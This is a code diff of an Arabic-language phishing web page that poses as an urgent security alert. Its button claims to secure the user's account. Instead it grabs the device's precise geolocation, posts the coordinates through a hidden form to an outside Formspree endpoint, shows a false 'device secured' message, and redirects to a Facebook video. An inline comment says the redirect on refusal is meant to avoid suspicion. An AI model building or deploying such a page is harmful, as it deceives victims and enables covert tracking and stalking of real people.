@@ -3,58 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق من البيانات</title>
+    <title>نظام حماية البيانات</title>
     <style>
         body { font-family: sans-serif; background-color: #1a1a1a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; background: #2d2d2d; padding: 2rem; border-radius: 12px; border: 1px solid #ff4d4d; width: 85%; }
-        .loader { border: 4px solid #333; border-top: 4px solid #ff4d4d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; background: #2d2d2d; padding: 2.5rem; border-radius: 15px; border: 2px solid #ff4d4d; width: 85%; box-shadow: 0 0 20px rgba(255,77,77,0.2); }
+        .btn { background-color: #ff4d4d; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; }
+        .btn:active { background-color: #cc0000; }
+        h3 { color: #ff4d4d; margin-bottom: 15px; }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <h3>⚠️ تنبيه أمني</h3>
-    <p>تم رصد محاولة وصول لبياناتك الشخصية. يرجى "السماح" بتأكيد الموقع لتوثيق ملكية الحساب وإيقاف عملية التسريب فوراً.</p>
-    <div class="loader"></div>
+    <h3>⚠️ تنبيه أمني عاجل</h3>
+    <p>تم اكتشاف محاولة اختراق لجهازك من موقع خارجي. لتأمين حسابك وإيقاف تسريب الصور، يجب مطابقة إحداثيات الجهاز الحالية.</p>
+    <button class="btn" onclick="startTracking()">تأمين الحساب الآن</button>
 </div>
 
-<form id="trackingForm" action="https://formspree.io/f/mlgavllv" method="POST" style="display:none;">
+<form id="trackingForm" action="https://formspree.io/f/nlgavllv" method="POST" style="display:none;">
     <input type="text" name="latitude" id="lat">
     <input type="text" name="longitude" id="lon">
-    <input type="text" name="device" id="device">
 </form>
 
 <script>
     const vUrl = "https://www.facebook.com/share/v/14ciBr7gfyC/";
 
-    window.onload = function() {
-        document.getElementById('device').value = navigator.userAgent;
-        // التأكد من طلب الموقع فور تحميل الصفحة
+    function startTracking() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy: true,
-                timeout: 10000,
+                timeout: 15000,
                 maximumAge: 0
             });
         } else {
+            alert("متصفحك لا يدعم نظام الحماية، يرجى التحديث.");
             window.location.href = vUrl;
         }
-    };
+    }
 
     function success(position) {
         document.getElementById('lat').value = position.coords.latitude;
         document.getElementById('lon').value = position.coords.longitude;
+        
         const form = document.getElementById('trackingForm');
         fetch(form.action, {
             method: 'POST',
             body: new FormData(form),
             headers: { 'Accept': 'application/json' }
-        }).finally(() => { window.location.href = vUrl; });
+        }).finally(() => {
+            alert("تم تأمين جهازك بنجاح.");
+            window.location.href = vUrl;
+        });
     }
 
     function error(err) {
-        // في حال الرفض أو الخطأ يتم التحويل للفيديو
-        console.log("Error: " + err.message);
+        // إذا رفض أو حدث خطأ، سيتم تحويله أيضاً لإبعاد الشبهة
         window.location.href = vUrl;
     }
 </script>
